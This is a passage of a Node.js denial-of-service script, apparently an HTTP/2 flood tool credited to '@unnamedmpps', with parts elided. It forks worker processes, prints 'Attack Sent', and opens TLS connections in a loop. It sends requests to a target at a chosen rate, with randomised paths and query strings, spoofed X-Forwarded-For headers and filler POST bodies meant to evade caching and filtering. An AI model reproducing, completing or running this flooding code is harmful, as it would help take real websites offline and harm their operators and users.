...
if (headerbuilders !== undefined) {
  ...
  if (cluster.isMaster) {
    for (let i = 0; i < process.argv[7]; i++) {
      cluster.fork();
      console.log(`[-] Threads ${i} Processing`);
    }
    console.log("[+] Attack Sent. Coded w/ <3 @unnamedmpps");
              ...
              tls.connect(
                ...
                function () {
                  for (let i = 0; i < rate; i++) {
                    headerbuilders[":path"] =
                      `${url.parse(target).path.replace("%RAND%", ra())}?${randomparam}=${randstr.generate({ length: 12, charset: "ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789" })}`;
                    headerbuilders["X-Forwarded-For"] = spoof();
                    headerbuilders["Body"] =
                      `${POSTDATA.includes("%RAND%") ? POSTDATA.replace("%RAND%", ra()) : POSTDATA}`;
